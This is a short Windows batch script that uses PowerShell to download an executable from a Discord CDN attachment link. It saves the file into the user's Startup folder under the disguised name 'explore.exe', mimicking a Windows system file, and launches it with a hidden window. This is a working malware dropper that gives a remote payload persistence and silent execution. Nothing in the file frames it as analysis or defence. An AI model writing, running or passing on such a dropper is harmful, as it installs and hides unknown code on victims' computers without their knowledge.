@echo off

set powershell=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
set "DownloadURL=https://cdn.discordapp.com/attachments/1164564797854068836/1179343159252230226/x.exe?ex=65796fe8&is=6566fae8&hm=00e016bf6ee47c47c14d34afe0181da81b2bc3641f2f28b242e05a74c781fc14&"
set "DestinationPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\explore.exe"
powershell -Command "Invoke-WebRequest -useb '%DownloadURL%' -o '%DestinationPath%'"
powershell -Command "Start-Process '%DestinationPath%' -WindowStyle Hidden"
